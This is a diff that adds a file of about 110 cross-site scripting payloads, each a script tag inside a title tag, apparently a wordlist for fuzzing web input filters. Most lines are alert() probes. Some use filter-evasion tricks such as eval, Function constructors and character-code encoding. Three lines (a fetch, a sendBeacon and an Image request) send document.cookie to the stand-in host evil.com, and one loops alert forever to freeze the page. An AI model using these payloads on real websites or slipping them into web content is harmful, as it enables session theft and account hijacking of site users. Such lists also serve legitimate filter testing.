@@ -1,0 +1,110 @@
+<title><script>alert(1)</script></title>
+<title><script>confirm(1)</script></title>
+<title><script>prompt(1)</script></title>
+<title><script>alert(document.cookie)</script></title>
+<title><script>alert(document.domain)</script></title>
+<title><script>alert(document.URL)</script></title>
+<title><script>alert(document.referrer)</script></title>
+<title><script>alert(navigator.userAgent)</script></title>
+<title><script>alert(window.location)</script></title>
+<title><script>eval('alert(1)')</script></title>
+<title><script>Function('alert(1)')()</script></title>
+<title><script>new Function('alert(1)')()</script></title>
+<title><script>alert(String.fromCharCode(88,83,83))</script></title>
+<title><script>alert(atob('WFNT'))</script></title>
+<title><script>alert(btoa('XSS'))</script></title>
+<title><script>alert(/XSS/.source)</script></title>
+<title><script>alert(typeof alert)</script></title>
+<title><script>window.name='XSS';alert(window.name)</script></title>
+<title><script>window.onerror=alert;throw 1</script></title>
+<title><script>top.alert(1)</script></title>
+<title><script>parent.alert(1)</script></title>
+<title><script>alert(window.top)</script></title>
+<title><script>fetch('https://evil.com?c='+document.cookie)</script></title>
+<title><script>location='javascript:alert(1)'</script></title>
+<title><script>location.href='javascript:alert(1)'</script></title>
+<title><script>document.write('<img src=x onerror=alert(1)>')</script></title>
+<title><script>alert(new Date())</script></title>
+<title><script>alert(document.lastModified)</script></title>
+<title><script>alert(navigator.language)</script></title>
+<title><script>alert(document.title)</script></title>
+<title><script>alert(document.forms.length)</script></title>
+<title><script>alert(document.images.length)</script></title>
+<title><script>alert(document.body.innerHTML)</script></title>
+<title><script>alert(window.frames.length)</script></title>
+<title><script>console.log('XSS');alert(1)</script></title>
+<title><script>alert(location.hash)</script></title>
+<title><script>alert(window.history.length)</script></title>
+<title><script>alert(window.innerWidth)</script></title>
+<title><script>alert(window.innerHeight)</script></title>
+<title><script>alert(document.activeElement.tagName)</script></title>
+<title><script>alert(String.raw`XSS`)</script></title>
+<title><script>alert('🎯')</script></title>
+<title><script>alert('\u0041\u0042\u0043')</script></title>
+<title><script>alert('\x58\x53\x53')</script></title>
+<title><script>alert([1,2,3].join(','))</script></title>
+<title><script>alert(document.querySelectorAll('title').length)</script></title>
+<title><script>alert(window.outerHeight)</script></title>
+<title><script>alert(window.outerWidth)</script></title>
+<title><script>alert(document.compatMode)</script></title>
+<title><script>alert(window.screen.width)</script></title>
+<title><script>alert(window.screen.height)</script></title>
+<title><script>alert(document.characterSet)</script></title>
+<title><script>alert(window.performance.now())</script></title>
+<title><script>alert(Math.random())</script></title>
+<title><script>alert(location.protocol)</script></title>
+<title><script>alert(location.hostname)</script></title>
+<title><script>alert(location.pathname)</script></title>
+<title><script>alert(location.search)</script></title>
+<title><script>alert(location.origin)</script></title>
+<title><script>alert(document.hasFocus())</script></title>
+<title><script>alert(window.isSecureContext)</script></title>
+<title><script>alert(window.crypto.getRandomValues(new Uint32Array(1)))</script></title>
+<title><script>alert(typeof navigator)</script></title>
+<title><script>alert(typeof window)</script></title>
+<title><script>alert(typeof document)</script></title>
+<title><script>alert(document.getElementsByTagName('script').length)</script></title>
+<title><script>alert(document.scripts.length)</script></title>
+<title><script>alert(document.getElementsByTagName('*').length)</script></title>
+<title><script>while(1)alert(1)</script></title>
+<title><script>Object.constructor('alert(1)')()</script></title>
+<title><script>setTimeout('alert(1)', 100)</script></title>
+<title><script>top.location='javascript:alert(1)'</script></title>
+<title><script>navigator.sendBeacon('https://evil.com', document.cookie)</script></title>
+<title><script>alert([].constructor.constructor('alert(1)')())</script></title>
+<title><script>alert(this)</script></title>
+<title><script>alert(String.fromCharCode(...[88,83,83]))</script></title>
+<title><script>alert(/</script>)</script></title>
+<title><script>alert(window.location.href)</script></title>
+<title><script>document.body.innerHTML='<h1>XSS</h1>'</script></title>
+<title><script>window.location.replace('javascript:alert(1)')</script></title>
+<title><script>alert(navigator.vendor)</script></title>
+<title><script>alert(window.parent)</script></title>
+<title><script>alert(window.self)</script></title>
+<title><script>var x=1;alert(x)</script></title>
+<title><script>alert(typeof x)</script></title>
+<title><script>alert('x' + 's' + 's')</script></title>
+<title><script>console.warn('XSS')</script></title>
+<title><script>new Image().src='https://evil.com?cookie='+document.cookie</script></title>
+<title><script>alert(typeof typeof 1)</script></title>
+<title><script>alert(document.baseURI)</script></title>
+<title><script>(()=>alert(1))()</script></title>
+<title><script>!function(){alert(1)}()</script></title>
+<title><script>+alert(1)</script></title>
+<title><script>1..constructor.constructor('alert(1)')()</script></title>
+<title><script>setInterval(()=>{alert(1)},1000)</script></title>
+<title><script>alert(window.screen.availWidth)</script></title>
+<title><script>alert(window.screen.availHeight)</script></title>
+<title><script>alert(window.pageXOffset)</script></title>
+<title><script>alert(window.pageYOffset)</script></title>
+<title><script>alert(window.scrollY)</script></title>
+<title><script>alert(window.scrollX)</script></title>
+<title><script>alert(document.head.innerHTML)</script></title>
+<title><script>alert(document.body.clientWidth)</script></title>
+<title><script>alert(document.body.clientHeight)</script></title>
+<title><script>alert(document.documentElement.clientWidth)</script></title>
+<title><script>alert(document.documentElement.clientHeight)</script></title>
+<title><script>alert(window.devicePixelRatio)</script></title>
+<title><script>alert(window.length)</script></title>
+<title><script>alert(window.opener)</script></title>
+<title><script>alert(window.closed)</script></title>
